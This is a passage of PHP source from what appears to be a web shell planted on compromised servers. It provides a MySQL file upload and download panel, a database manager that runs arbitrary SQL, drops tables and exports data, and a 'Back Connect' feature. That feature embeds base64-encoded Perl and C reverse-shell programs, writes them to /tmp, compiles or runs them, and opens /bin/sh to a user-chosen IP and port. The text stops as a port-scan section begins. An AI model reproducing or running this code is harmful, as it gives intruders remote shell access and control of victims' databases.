?>
&lt;script type="text/javascript"&gt;
function mysqlfile(doing){
	if(!doing) return;
	$('doing').value=doing;
	$('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
	$('mysqlfile').dbport.value=$('dbinfo').dbport.value;
	$('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
	$('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
	$('mysqlfile').dbname.value=$('dbinfo').dbname.value;
	$('mysqlfile').charset.value=$('dbinfo').charset.value;
	$('mysqlfile').submit();
}
&lt;/script&gt;
<?php
	!$dbhost && $dbhost = 'localhost';
	!$dbuser && $dbuser = 'root';
	!$dbport && $dbport = '3306';
	formhead(array('title'=&gt;'MYSQL Information','name'=&gt;'dbinfo'));
	makehide('action','sqlfile');
	p('&lt;p&gt;');
	p('DBHost:');
	makeinput(array('name'=&gt;'dbhost','size'=&gt;20,'value'=&gt;$dbhost));
	p(':');
	makeinput(array('name'=&gt;'dbport','size'=&gt;4,'value'=&gt;$dbport));
	p('DBUser:');
	makeinput(array('name'=&gt;'dbuser','size'=&gt;15,'value'=&gt;$dbuser));
	p('DBPass:');
	makeinput(array('name'=&gt;'dbpass','size'=&gt;15,'value'=&gt;$dbpass));
	p('DBName:');
	makeinput(array('name'=&gt;'dbname','size'=&gt;15,'value'=&gt;$dbname));
	p('DBCharset:');
	makeselect(array('name'=&gt;'charset','option'=&gt;$charsetdb,'selected'=&gt;$charset,'nokey'=&gt;1));
	p('&lt;/p&gt;');
	formfoot();
	p('&lt;form action="'.$self.'" method="POST" enctype="multipart/form-data" name="mysqlfile" id="mysqlfile"&gt;');
	p('&lt;h2&gt;Upload file&lt;/h2&gt;');
	p('&lt;p&gt;&lt;b&gt;This operation the DB user must has FILE privilege&lt;/b&gt;&lt;/p&gt;');
	p('&lt;p&gt;Save path(fullpath): &lt;input class="input" name="savepath" size="45" type="text" /&gt; Choose a file: &lt;input class="input" name="uploadfile" type="file" /&gt; &lt;a href="javascript:mysqlfile(\'mysqlupload\');"&gt;Upload&lt;/a&gt;&lt;/p&gt;');
	p('&lt;h2&gt;Download file&lt;/h2&gt;');
	p('&lt;p&gt;File: &lt;input class="input" name="mysqldlfile" size="115" type="text" /&gt; &lt;a href="javascript:mysqlfile(\'mysqldown\');"&gt;Download&lt;/a&gt;&lt;/p&gt;');
	makehide('dbhost');
	makehide('dbport');
	makehide('dbuser');
	makehide('dbpass');
	makehide('dbname');
	makehide('charset');
	makehide('doing');
	makehide('action','sqlfile');
	p('&lt;/form&gt;');
}

elseif ($action == 'mysqladmin') {
	!$dbhost && $dbhost = 'localhost';
	!$dbuser && $dbuser = 'root';
	!$dbport && $dbport = '3306';
	$dbform = '&lt;input type="hidden" id="connect" name="connect" value="1" /&gt;';
	if(isset($dbhost)){
		$dbform .= "&lt;input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" /&gt;\n";
	}
	if(isset($dbuser)) {
		$dbform .= "&lt;input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" /&gt;\n";
	}
	if(isset($dbpass)) {
		$dbform .= "&lt;input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" /&gt;\n";
	}
	if(isset($dbport)) {
		$dbform .= "&lt;input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" /&gt;\n";
	}
	if(isset($dbname)) {
		$dbform .= "&lt;input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" /&gt;\n";
	}
	if(isset($charset)) {
		$dbform .= "&lt;input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" /&gt;\n";
	}

	if ($doing == 'backupmysql' && $saveasfile) {
		if (!$table) {
			m('Please choose the table');
		} else {
			$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			$fp = @fopen($path,'w');
			if ($fp) {
				foreach($table as $k =&gt; $v) {
					if ($v) {
						sqldumptable($v, $fp);
					}
				}
				fclose($fp);				
				$fileurl = str_replace(SA_ROOT,'',$path);
				m('Database has success backup to &lt;a href="'.$fileurl.'" target="_blank"&gt;'.$path.'&lt;/a&gt;');
				mysql_close();
			} else {
				m('Backup failed');
			}
		}
	}
	if ($insert && $insertsql) {
		$keystr = $valstr = $tmp = '';
		foreach($insertsql as $key =&gt; $val) {
			if ($val) {
				$keystr .= $tmp.$key;
				$valstr .= $tmp."'".addslashes($val)."'";
				$tmp = ',';
			}
		}
		if ($keystr && $valstr) {
			$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
		}
	}
	if ($update && $insertsql && $base64) {
		$valstr = $tmp = '';
		foreach($insertsql as $key =&gt; $val) {
			$valstr .= $tmp.$key."='".addslashes($val)."'";
			$tmp = ',';
		}
		if ($valstr) {
			$where = base64_decode($base64);
			$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
			m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
		}
	}
	if ($doing == 'del' && $base64) {
		$where = base64_decode($base64);
		$delete_sql = "DELETE FROM $tablename WHERE $where";
		$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
	}

	if ($tablename && $doing == 'drop') {
		$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);
		if (q("DROP TABLE $tablename")) {
			m('Drop table of success');
			$tablename = '';
		} else {
			m(mysql_error());
		}
	}

	formhead(array('title'=&gt;'MYSQL Manager'));
	makehide('action','mysqladmin');
	p('&lt;p&gt;');
	p('DBHost:');
	makeinput(array('name'=&gt;'dbhost','size'=&gt;20,'value'=&gt;$dbhost));
	p(':');
	makeinput(array('name'=&gt;'dbport','size'=&gt;4,'value'=&gt;$dbport));
	p('DBUser:');
	makeinput(array('name'=&gt;'dbuser','size'=&gt;15,'value'=&gt;$dbuser));
	p('DBPass:');
	makeinput(array('name'=&gt;'dbpass','size'=&gt;15,'value'=&gt;$dbpass));
	p('DBCharset:');
	makeselect(array('name'=&gt;'charset','option'=&gt;$charsetdb,'selected'=&gt;$charset,'nokey'=&gt;1));
	makeinput(array('name'=&gt;'connect','value'=&gt;'Connect','type'=&gt;'submit','class'=&gt;'bt'));
	p('&lt;/p&gt;');
	formfoot();

	//²Ù×÷¼ÇÂ¼
	formhead(array('name'=&gt;'recordlist'));
	makehide('doing');
	makehide('action','mysqladmin');
	makehide('base64');
	makehide('tablename');
	p($dbform);
	formfoot();

	//Ñ¡¶¨Êý¾Ý¿â
	formhead(array('name'=&gt;'setdbname'));
	makehide('action','mysqladmin');
	p($dbform);
	if (!$dbname) {
		makehide('dbname');
	}
	formfoot();

	//Ñ¡¶¨±í
	formhead(array('name'=&gt;'settable'));
	makehide('action','mysqladmin');
	p($dbform);
	makehide('tablename');
	makehide('page',$page);
	makehide('doing');
	formfoot();

	$cachetables = array();	
	$pagenum = 30;
	$page = intval($page);
	if($page) {
		$start_limit = ($page - 1) * $pagenum;
	} else {
		$start_limit = 0;
		$page = 1;
	}
	if (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {
		$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
		//»ñÈ¡Êý¾Ý¿âÐÅÏ¢
		$mysqlver = mysql_get_server_info();
		p('&lt;p&gt;MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'&lt;/p&gt;');
		$highver = $mysqlver &gt; '4.1' ? 1 : 0;

		//»ñÈ¡Êý¾Ý¿â
		$query = q("SHOW DATABASES");
		$dbs = array();
		$dbs[] = '-- Select a database --';
		while($db = mysql_fetch_array($query)) {
			$dbs[$db['Database']] = $db['Database'];
		}
		makeselect(array('title'=&gt;'Please select a database:','name'=&gt;'db[]','option'=&gt;$dbs,'selected'=&gt;$dbname,'onchange'=&gt;'moddbname(this.options[this.selectedIndex].value)','newline'=&gt;1));
		$tabledb = array();
		if ($dbname) {
			p('&lt;p&gt;');
			p('Current dababase: &lt;a href="javascript:moddbname(\''.$dbname.'\');"&gt;'.$dbname.'&lt;/a&gt;');
			if ($tablename) {
				p(' | Current Table: &lt;a href="javascript:settable(\''.$tablename.'\');"&gt;'.$tablename.'&lt;/a&gt; [ &lt;a href="javascript:settable(\''.$tablename.'\', \'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''.$tablename.'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''.$tablename.'\', \'drop\');"&gt;Drop&lt;/a&gt; ]');
			}
			p('&lt;/p&gt;');
			mysql_select_db($dbname);

			$getnumsql = '';
			$runquery = 0;
			if ($sql_query) {
				$runquery = 1;
			}
			$allowedit = 0;
			if ($tablename && !$sql_query) {
				$sql_query = "SELECT * FROM $tablename";
				$getnumsql = $sql_query;
				$sql_query = $sql_query." LIMIT $start_limit, $pagenum";
				$allowedit = 1;
			}
			p('&lt;form action="'.$self.'" method="POST"&gt;');
			p('&lt;p&gt;&lt;table width="200" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td colspan="2"&gt;Run SQL query/queries on database '.$dbname.':&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;"&gt;'.htmlspecialchars($sql_query,ENT_QUOTES).'&lt;/textarea&gt;&lt;/td&gt;&lt;td style="padding:0 5px;"&gt;&lt;input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;');
			makehide('tablename', $tablename);
			makehide('action','mysqladmin');
			p($dbform);
			p('&lt;/form&gt;');
			if ($tablename || ($runquery && $sql_query)) {
				if ($doing == 'structure') {
					$result = q("SHOW FULL COLUMNS FROM $tablename");
					$rowdb = array();
					while($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					p('&lt;h3&gt;Structure&lt;/h3&gt;');
					p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');
					p('&lt;tr class="head"&gt;');
					p('&lt;td&gt;Field&lt;/td&gt;');
					p('&lt;td&gt;Type&lt;/td&gt;');
					p('&lt;td&gt;Collation&lt;/td&gt;');
					p('&lt;td&gt;Null&lt;/td&gt;');
					p('&lt;td&gt;Key&lt;/td&gt;');
					p('&lt;td&gt;Default&lt;/td&gt;');
					p('&lt;td&gt;Extra&lt;/td&gt;');
					p('&lt;td&gt;Privileges&lt;/td&gt;');
					p('&lt;td&gt;Comment&lt;/td&gt;');
					p('&lt;/tr&gt;');
					foreach ($rowdb as $row) {
						$thisbg = bg();
						p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
						p('&lt;td&gt;'.$row['Field'].'&lt;/td&gt;');
						p('&lt;td&gt;'.$row['Type'].'&lt;/td&gt;');
						p('&lt;td&gt;'.$row['Collation'].'&nbsp;&lt;/td&gt;');
						p('&lt;td&gt;'.$row['Null'].'&nbsp;&lt;/td&gt;');
						p('&lt;td&gt;'.$row['Key'].'&nbsp;&lt;/td&gt;');
						p('&lt;td&gt;'.$row['Default'].'&nbsp;&lt;/td&gt;');
						p('&lt;td&gt;'.$row['Extra'].'&nbsp;&lt;/td&gt;');
						p('&lt;td&gt;'.$row['Privileges'].'&nbsp;&lt;/td&gt;');
						p('&lt;td&gt;'.$row['Comment'].'&nbsp;&lt;/td&gt;');
						p('&lt;/tr&gt;');
					}
					tbfoot();
					$result = q("SHOW INDEX FROM $tablename");
					$rowdb = array();
					while($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					p('&lt;h3&gt;Indexes&lt;/h3&gt;');
					p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');
					p('&lt;tr class="head"&gt;');
					p('&lt;td&gt;Keyname&lt;/td&gt;');
					p('&lt;td&gt;Type&lt;/td&gt;');
					p('&lt;td&gt;Unique&lt;/td&gt;');
					p('&lt;td&gt;Packed&lt;/td&gt;');
					p('&lt;td&gt;Seq_in_index&lt;/td&gt;');
					p('&lt;td&gt;Field&lt;/td&gt;');
					p('&lt;td&gt;Cardinality&lt;/td&gt;');
					p('&lt;td&gt;Collation&lt;/td&gt;');
					p('&lt;td&gt;Null&lt;/td&gt;');
					p('&lt;td&gt;Comment&lt;/td&gt;');
					p('&lt;/tr&gt;');
					foreach ($rowdb as $row) {
						$thisbg = bg();
						p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
						p('&lt;td&gt;'.$row['Key_name'].'&lt;/td&gt;');
						p('&lt;td&gt;'.$row['Index_type'].'&lt;/td&gt;');
						p('&lt;td&gt;'.($row['Non_unique'] ? 'No' : 'Yes').'&nbsp;&lt;/td&gt;');
						p('&lt;td&gt;'.($row['Packed'] === null ? 'No' : $row['Packed']).'&nbsp;&lt;/td&gt;');
						p('&lt;td&gt;'.$row['Seq_in_index'].'&lt;/td&gt;');
						p('&lt;td&gt;'.$row['Column_name'].($row['Sub_part'] ? '('.$row['Sub_part'].')' : '').'&nbsp;&lt;/td&gt;');
						p('&lt;td&gt;'.($row['Cardinality'] ? $row['Cardinality'] : 0).'&nbsp;&lt;/td&gt;');
						p('&lt;td&gt;'.$row['Collation'].'&nbsp;&lt;/td&gt;');
						p('&lt;td&gt;'.$row['Null'].'&nbsp;&lt;/td&gt;');
						p('&lt;td&gt;'.$row['Comment'].'&nbsp;&lt;/td&gt;');
						p('&lt;/tr&gt;');
					}
					tbfoot();
				} elseif ($doing == 'insert' || $doing == 'edit') {
					$result = q('SHOW COLUMNS FROM '.$tablename);
					while ($row = mysql_fetch_array($result)) {
						$rowdb[] = $row;
					}
					$rs = array();
					if ($doing == 'insert') {
						p('&lt;h2&gt;Insert new line in '.$tablename.' table &raquo;&lt;/h2&gt;');
					} else {
						p('&lt;h2&gt;Update record in '.$tablename.' table &raquo;&lt;/h2&gt;');
						$where = base64_decode($base64);
						$result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
						$rs = mysql_fetch_array($result);
					}
					p('&lt;form method="post" action="'.$self.'"&gt;');
					p($dbform);
					makehide('action','mysqladmin');
					makehide('tablename',$tablename);
					p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');
					foreach ($rowdb as $row) {
						if ($rs[$row['Field']]) {
							$value = htmlspecialchars($rs[$row['Field']]);
						} else {
							$value = '';
						}
						$thisbg = bg();
						p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
						if ($row['Key'] == 'UNI' || $row['Extra'] == 'auto_increment' || $row['Key'] == 'PRI') {
							p('&lt;td&gt;&lt;b&gt;'.$row['Field'].'&lt;/b&gt;&lt;br /&gt;'.$row['Type'].'&lt;/td&gt;&lt;td&gt;'.$value.'&nbsp;&lt;/td&gt;&lt;/tr&gt;');
						} else {							
							p('&lt;td&gt;&lt;b&gt;'.$row['Field'].'&lt;/b&gt;&lt;br /&gt;'.$row['Type'].'&lt;/td&gt;&lt;td&gt;&lt;textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;"&gt;'.$value.'&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;');
						}
					}
					if ($doing == 'insert') {
						p('&lt;tr class="'.bg().'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt" type="submit" name="insert" value="Insert" /&gt;&lt;/td&gt;&lt;/tr&gt;');
					} else {
						p('&lt;tr class="'.bg().'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt" type="submit" name="update" value="Update" /&gt;&lt;/td&gt;&lt;/tr&gt;');
						makehide('base64', $base64);
					}
					p('&lt;/table&gt;&lt;/form&gt;');
				} else {
					$querys = @explode(';',$sql_query);
					foreach($querys as $num=&gt;$query) {
						if ($query) {
							p("&lt;p&gt;&lt;b&gt;Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."&lt;/b&gt;&lt;/p&gt;");
							switch(qy($query))
							{
								case 0:
									p('&lt;h2&gt;Error : '.mysql_error().'&lt;/h2&gt;');
									break;	
								case 1:
									if (strtolower(substr($query,0,13)) == 'select * from') {
										$allowedit = 1;
									}
									if ($getnumsql) {
										$tatol = mysql_num_rows(q($getnumsql));
										$multipage = multi($tatol, $pagenum, $page, $tablename);
									}
									if (!$tablename) {
										$sql_line = str_replace(array("\r", "\n", "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));
										$sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
										preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i",$sql_line,$matches);
										$tablename = $matches[1][0];
									}

									/*********************/
									$getfield = q("SHOW COLUMNS FROM $tablename");
									$rowdb = array();
									$keyfied = ''; //Ö÷¼ü×Ö¶Î
									while($row = @mysql_fetch_assoc($getfield)) {
										$rowdb[$row['Field']]['Key'] = $row['Key'];
										$rowdb[$row['Field']]['Extra'] = $row['Extra'];
										if ($row['Key'] == 'UNI' || $row['Key'] == 'PRI') {
											$keyfied = $row['Field'];
										}
									}
									/*********************/								
									//Ö±½Óä¯ÀÀ±í°´ÕÕÖ÷¼ü½µÐòÅÅÁÐ
									if ($keyfied && strtolower(substr($query,0,13)) == 'select * from') {
										$query = str_replace(" LIMIT ", " order by $keyfied DESC LIMIT ", $query);
									}

									$result = q($query);

									p($multipage);
									p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');
									p('&lt;tr class="head"&gt;');
									if ($allowedit) p('&lt;td&gt;Action&lt;/td&gt;');
									$fieldnum = @mysql_num_fields($result);
									for($i=0;$i&lt;$fieldnum;$i++){
										$name = @mysql_field_name($result, $i);
										$type = @mysql_field_type($result, $i);
										$len = @mysql_field_len($result, $i);
										p("&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '&lt;b&gt; - PRIMARY&lt;/b&gt;' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '&lt;b&gt; - Auto&lt;/b&gt;' : '')."&lt;/span&gt;&lt;/td&gt;");
									}
									p('&lt;/tr&gt;');
									
									while($mn = @mysql_fetch_assoc($result)){
										$thisbg = bg();
										p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
										$where = $tmp = $b1 = '';
										//Ñ¡È¡Ìõ¼þ×Ö¶ÎÓÃ
										foreach($mn as $key=&gt;$inside){
											if ($inside) {
												//²éÕÒÖ÷¼ü¡¢Î¨Ò»ÊôÐÔ¡¢×Ô¶¯Ôö¼ÓµÄ×Ö¶Î£¬ÕÒµ½¾ÍÍ£Ö¹£¬·ñÔò×éºÏËùÓÐ×Ö¶Î×÷ÎªÌõ¼þ¡£
												if ($rowdb[$key]['Key'] == 'UNI' || $rowdb[$key]['Extra'] == 'auto_increment' || $rowdb[$key]['Key'] == 'PRI') {
													$where = $key."='".addslashes($inside)."'";
													break;
												}
												$where .= $tmp.$key."='".addslashes($inside)."'";
												$tmp = ' AND ';
											}
										}
										//¶ÁÈ¡¼ÇÂ¼ÓÃ
										foreach($mn as $key=&gt;$inside){
											$b1 .= '&lt;td nowrap&gt;'.html_clean($inside).'&nbsp;&lt;/td&gt;';
										}
										$where = base64_encode($where);

										if ($allowedit) p('&lt;td nowrap&gt;&lt;a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');"&gt;Edit&lt;/a&gt; | &lt;a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');"&gt;Del&lt;/a&gt;&lt;/td&gt;');

										p($b1);
										p('&lt;/tr&gt;');
										unset($b1);
									}
									p('&lt;tr class="head"&gt;');
									if ($allowedit) p('&lt;td&gt;Action&lt;/td&gt;');
									$fieldnum = @mysql_num_fields($result);
									for($i=0;$i&lt;$fieldnum;$i++){
										$name = @mysql_field_name($result, $i);
										$type = @mysql_field_type($result, $i);
										$len = @mysql_field_len($result, $i);
										p("&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '&lt;b&gt; - PRIMARY&lt;/b&gt;' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '&lt;b&gt; - Auto&lt;/b&gt;' : '')."&lt;/span&gt;&lt;/td&gt;");
									}
									p('&lt;/tr&gt;');
									tbfoot();
									p($multipage);
									break;
								case 2:
									$ar = mysql_affected_rows();
									p('&lt;h2&gt;affected rows : &lt;b&gt;'.$ar.'&lt;/b&gt;&lt;/h2&gt;');
									break;
							}
						}
					}
				}
			} else {
				$query = q("SHOW TABLE STATUS");
				$table_num = $table_rows = $data_size = 0;
				$tabledb = array();
				while($table = mysql_fetch_array($query)) {
					$data_size = $data_size + $table['Data_length'];
					$table_rows = $table_rows + $table['Rows'];
					$table['Data_length'] = sizecount($table['Data_length']);
					$table_num++;
					$tabledb[] = $table;
				}
				$data_size = sizecount($data_size);
				unset($table);
				p('&lt;table border="0" cellpadding="0" cellspacing="0"&gt;');
				p('&lt;form action="'.$self.'" method="POST"&gt;');
				makehide('action','mysqladmin');
				p($dbform);
				p('&lt;tr class="head"&gt;');
				p('&lt;td width="2%" align="center"&gt;&nbsp;&lt;/td&gt;');
				p('&lt;td&gt;Name&lt;/td&gt;');
				p('&lt;td&gt;Rows&lt;/td&gt;');
				p('&lt;td&gt;Data_length&lt;/td&gt;');
				p('&lt;td&gt;Create_time&lt;/td&gt;');
				p('&lt;td&gt;Update_time&lt;/td&gt;');
				if ($highver) {
					p('&lt;td&gt;Engine&lt;/td&gt;');
					p('&lt;td&gt;Collation&lt;/td&gt;');
				}
				p('&lt;td&gt;Operate&lt;/td&gt;');
				p('&lt;/tr&gt;');
				foreach ($tabledb as $key =&gt; $table) {
					$thisbg = bg();
					p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
					p('&lt;td align="center" width="2%"&gt;&lt;input type="checkbox" name="table[]" value="'.$table['Name'].'" /&gt;&lt;/td&gt;');
					p('&lt;td&gt;&lt;a href="javascript:settable(\''.$table['Name'].'\');"&gt;'.$table['Name'].'&lt;/a&gt;&lt;/td&gt;');
					p('&lt;td&gt;'.$table['Rows'].'&lt;/td&gt;');
					p('&lt;td&gt;'.$table['Data_length'].'&lt;/td&gt;');
					p('&lt;td&gt;'.$table['Create_time'].'&nbsp;&lt;/td&gt;');
					p('&lt;td&gt;'.$table['Update_time'].'&nbsp;&lt;/td&gt;');
					if ($highver) {
						p('&lt;td&gt;'.$table['Engine'].'&lt;/td&gt;');
						p('&lt;td&gt;'.$table['Collation'].'&lt;/td&gt;');
					}
					p('&lt;td&gt;&lt;a href="javascript:settable(\''.$table['Name'].'\', \'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''.$table['Name'].'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''.$table['Name'].'\', \'drop\');"&gt;Drop&lt;/a&gt;&lt;/td&gt;');
					p('&lt;/tr&gt;');
				}
				p('&lt;tr class="head"&gt;');
				p('&lt;td width="2%" align="center"&gt;&lt;input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;');
				p('&lt;td&gt;Name&lt;/td&gt;');
				p('&lt;td&gt;Rows&lt;/td&gt;');
				p('&lt;td&gt;Data_length&lt;/td&gt;');
				p('&lt;td&gt;Create_time&lt;/td&gt;');
				p('&lt;td&gt;Update_time&lt;/td&gt;');
				if ($highver) {
					p('&lt;td&gt;Engine&lt;/td&gt;');
					p('&lt;td&gt;Collation&lt;/td&gt;');
				}
				p('&lt;td&gt;Operate&lt;/td&gt;');
				p('&lt;/tr&gt;');
				p('&lt;tr class='.bg().'&gt;');
				p('&lt;td&gt;&nbsp;&lt;/td&gt;');
				p('&lt;td&gt;Total tables: '.$table_num.'&lt;/td&gt;');
				p('&lt;td&gt;'.$table_rows.'&lt;/td&gt;');
				p('&lt;td&gt;'.$data_size.'&lt;/td&gt;');
				p('&lt;td colspan="'.($highver ? 5 : 3).'"&gt;&nbsp;&lt;/td&gt;');
				p('&lt;/tr&gt;');

				p("&lt;tr class=\"".bg()."\"&gt;&lt;td colspan=\"".($highver ? 9 : 7)."\"&gt;&lt;input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /&gt; Save as file &lt;input class=\"input\" name=\"path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /&gt; &lt;input class=\"bt\" type=\"submit\" value=\"Export selection table\" /&gt;&lt;/td&gt;&lt;/tr&gt;");
				makehide('doing','backupmysql');
				formfoot();
				p("&lt;/table&gt;");
				fr($query);
			}
		}
	}
	tbfoot();
	@mysql_close();
}//end mysql

elseif ($action == 'backconnect') {
	!$yourip && $yourip = $_SERVER['REMOTE_ADDR'];
	!$yourport && $yourport = '12345';
	$usedb = array('perl'=&gt;'perl','c'=&gt;'c');

	$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
		"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
		"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
		"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
		"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
		"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
		"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
	$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".
		"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".
		"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".
		"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".
		"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".
		"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
		"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
		"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";

	if ($start && $yourip && $yourport && $use){
		if ($use == 'perl') {
			cf('/tmp/angel_bc',$back_connect);
			$res = execute(which('perl')." /tmp/angel_bc $yourip $yourport &");
		} else {
			cf('/tmp/angel_bc.c',$back_connect_c);
			$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
			@unlink('/tmp/angel_bc.c');
			$res = execute("/tmp/angel_bc $yourip $yourport &");
		}
		m("Now script try connect to $yourip port $yourport ...");
	}

	formhead(array('title'=&gt;'Back Connect'));
	makehide('action','backconnect');
	p('&lt;p&gt;');
	p('Your IP:');
	makeinput(array('name'=&gt;'yourip','size'=&gt;20,'value'=&gt;$yourip));
	p('Your Port:');
	makeinput(array('name'=&gt;'yourport','size'=&gt;15,'value'=&gt;$yourport));
	p('Use:');
	makeselect(array('name'=&gt;'use','option'=&gt;$usedb,'selected'=&gt;$use));
	makeinput(array('name'=&gt;'start','value'=&gt;'Start','type'=&gt;'submit','class'=&gt;'bt'));
	p('&lt;/p&gt;');
	formfoot();
}//end

elseif ($action == 'portscan') {
	!$scanip && $scanip = '127.0.0.1';
